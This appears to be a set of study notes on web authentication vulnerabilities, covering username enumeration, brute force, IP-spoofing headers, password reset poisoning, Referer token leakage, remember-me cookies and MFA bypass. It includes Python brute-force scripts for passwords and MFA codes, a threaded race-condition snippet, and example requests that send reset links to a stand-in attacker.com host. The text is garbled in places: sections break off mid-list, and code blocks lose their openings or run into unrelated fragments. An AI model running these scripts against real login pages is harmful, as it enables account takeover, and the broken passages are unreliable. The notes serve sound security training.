## Authentication Vulnerabilities

- **What authentication is**
  - The process of verifying that users are who they claim to be
  - Foundation of security for most web applications
  - Distinct from authorization (which determines what authenticated users can do)
  - Generally based on one or more authentication factors:
    - Something you know (passwords, security questions)
    - Something you have (mobile phone, security token)
    - Something you are (biometrics)
  - Critical security mechanism that exposes applications to severe risk when compromised

- **How authentication vulnerabilities arise**
  
  - **Weak authentication mechanisms**
    - Insufficient protection against brute-force attacks
    - Lack of rate limiting or account lockout
    - Predictable credential reset mechanisms
    - Insecure transmission of credentials
  
  - **Logic flaws**
    - Flawed implementation of authentication processes
    - Missing validation steps in multi-stage processes
    - Inconsistent handling of usernames, passwords, or character sets
    - Race conditions in authentication flows
  
  - **Information leakage**
    - Verbose error messages revealing valid usernames or other sensitive data
    - Response timing discrepancies revealing valid vs. invalid credentials
    - HTTP status code differences for valid vs. invalid attempts
    - Insecure logging of authentication attempts

- **Password-based authentication vulnerabilities**
  
  - **Username enumeration**
    
    - **Via different responses**
      - Error messages: "Invalid username" vs. "Invalid password"
      - Response content differences for valid vs. invalid users
      - Example:
        ```
        Invalid username: "Username does not exist"
        Valid username: "Incorrect password"
        ```
      - Detection: Compare responses for known valid and invalid usernames
      - Exploitation: Systematically test usernames to identify valid ones
    
    - **Via response timing**
      - Applications checking password only after validating username
      - Example: Valid username + incorrect password takes longer to process
      - Detection: Measure response times for different username submissions
      - Exploitation: Script to identify usernames with longer response times
    
    - **Via account lockout**
      - Lockout messages revealing that an account exists
      - Example: "Account locked after multiple attempts" only for valid users
      - Detection: Make multiple failed login attempts for different usernames
      - Exploitation: Note which accounts trigger lockout messages
  
  - **Brute-force vulnerabilities**
    
    - **Simple brute-force attacks**
      - Trying every possible password for a known username
      - Detection: Test if application allows unlimited login attempts
      - Exploitation: Automated tools (Burp Intruder, Hydra) to try password lists
      - Example attack script:
        ```python
        import requests

        username = "identified_user"
        password_list = ["password1", "password2", ...]

        for password in password_list:
            response = requests.post(
                "https://vulnerable-website.com/login",
                data={"username": username, "password": password}
            )
            if "Incorrect password" not in response.text:
                print(f"Valid password found: {password}")
                break
        ```
    
    - **Username and password enumeration**
      - Combining username enumeration with password brute-forcing
      - Detection: Identified username enumeration vulnerability
      - Exploitation: First enumerate valid usernames, then brute-force each user's password
    
    - **Bypassing IP-based brute-force protection**
      - Using multiple IP addresses (proxy services, distributed attacks)
      - Adding custom HTTP headers to spoof IP:
        - X-Forwarded-For
        - X-Remote-IP
        - X-Originating-IP
        - X-Remote-Addr
        - X-Client-IP
      - Example request with spoofed IP:
        ```http
        POST /login HTTP/1.1
        Host: vulnerable-website.com
        X-Forwarded-For: 192.168.0.1
        ...

        username=victim&password=password123
        ```
      - Detection: Test if adding IP-spoofing headers bypasses restrictions
      - Exploitation: Rotate IP values in headers while making login attempts
    
    - **Credential stuffing**
      - Using leaked username/password pairs from other sites
      - Detection: Test known credential pairs from leaked databases
      - Exploitation: Tools like Burp Intruder to test lists of leaked credentials
  
  - **Flawed credential reset**
    
    - **Password reset poisoning**
      - Manipulating password reset functionality to send reset links to attacker
      - Example techniques:
        - Modifying Host header to redirect emails
        - Injecting extra headers (X-Forwarded-Host)
      - Example request:
        ```http
        POST /forgot-password HTTP/1.1
        Host: vulnerable-website.com
        X-Forwarded-Host: attacker.com
        ...

        email=victim@gmail.com
        ```
      - Detection: Test if reset emails use header values for links
      - Exploitation: Capture reset tokens sent to attacker-controlled domain

      - Exploitation: Predict valid tokens for other users
      - Example: Tokens based on timestamp or user ID can be predicted
    
    - **Reset token leakage in referer header**
      - Reset tokens leaked in Referer header when site contains external resources
      - Detection: Check if reset pages contain links to external resources
      - Exploitation: Set up malicious site to capture Referer headers
      - Example:
        ```
        1. User clicks reset link with token: /reset?token=TOKEN123
        2. Reset page loads resources from attacker.com
        3. Referer header sent to attacker.com contains the token
        ```
  
  - **"Remember me" functionality flaws**
    
    - **Insecure persistent cookie generation**
      - Predictable or weakly protected "remember me" cookies
      - Detection: Analyze cookie values for patterns or encoding
      - Exploitation: Decode, modify, or predict cookies to access other accounts
      - Example attack approaches:
        - Base64-decoded cookies containing username: `Base64("username:timestamp")`
        - MD5-hashed usernames: `md5("username")`
        - Predictable data structures: `{"user": "admin", "timestamp": 1609459200}`
    
    - **Insufficient cookie validation**

        - Change URL after login but before MFA step
        - Manipulate cookies or session tokens after initial login
        - Access sub-pages directly after primary authentication

        ```
        1. Login with valid credentials to /login
        2. Instead of proceeding to /mfa-verification
        3. Try accessing /account or /dashboard directly
        ```
    
    - **MFA not required for API endpoints or mobile API**
      - Web APIs lacking the same MFA checks as UI flows
      - Detection: Analyze API endpoints for authentication requirements
      - Exploitation: Directly call API endpoints, bypassing MFA
      - Example:
        ```
        # Normal UI flow
        POST /login -> POST /mfa-verify -> POST /api/user/data

        # Bypass attempt
        POST /login -> POST /api/user/data (skipping MFA)
        ```
  
  - **Flawed MFA verification logic**
    
    - **Brute-forcing MFA tokens**
      - Applications allowing unlimited attempts to enter MFA codes
      - Detection: Test multiple incorrect MFA codes to see if limited

        session = requests.Session()
        # Assume successful login already completed
        
        for code in range(1000):
            code_formatted = f"{code:04d}"  # 4-digit code with leading zeros
            response = session.post(
                "https://vulnerable-website.com/mfa-verify",
                data={"mfa-code": code_formatted}
            )
            if "Incorrect code" not in response.text:

        # Assume successful login already completed
        
        def access_protected_page():
            response = session.get("https://vulnerable-website.com/account")
            # Check if access was successful
        
        # Create multiple simultaneous requests
        threads = []
        for _ in range(10):
            t = threading.Thread(target=access_protected_page)

            return "Too many failed attempts for this user"
          }
